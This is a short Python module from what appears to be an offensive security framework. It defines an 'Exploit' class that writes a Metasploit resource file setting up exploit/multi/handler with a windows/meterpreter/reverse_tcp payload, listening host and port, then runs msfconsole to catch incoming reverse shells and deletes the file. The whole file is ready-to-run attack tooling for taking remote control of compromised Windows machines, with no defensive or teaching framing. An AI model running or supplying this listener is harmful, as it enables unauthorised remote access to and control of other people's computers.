#!/usr/bin/env python
# encoding: utf-8
import os
from core.Option import *
from protocol.tcp.TCPClient import *


class Exploit(TCPClient):
    __info__ = {
        "name": "handler_MSF",
        "description": "handler_MSF",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }
    lhost = IPOption("", "本地监听IP地址")
    lport = PortOption(4444, "本地监听端口")
    payload = StringOption("windows/meterpreter/reverse_tcp", "填写payload，默认是windows/meterpreter/reverse_tcp")
    
    def __init__(self):
        self.endianness = "<"

    def run(self):
        LHOST = self.lhost
        LPORT = self.lport
        PAYLOAD = self.payload
        config_file = open('handler_MSF.rc', 'w')
        config_file.write('printf "\033c"\n')
        config_file.write('use exploit/multi/handler\n')
        config_file.write('set PAYLOAD ')
        config_file.write(PAYLOAD+ '\n')
        config_file.write('set LHOST ' + str(LHOST) + '\n')
        config_file.write('set LPORT ' + str(LPORT) + '\n')
        config_file.write('exploit -j\n')
        config_file.close()
        os.system('msfconsole -r handler_MSF.rc')
        os.remove('handler_MSF.rc')
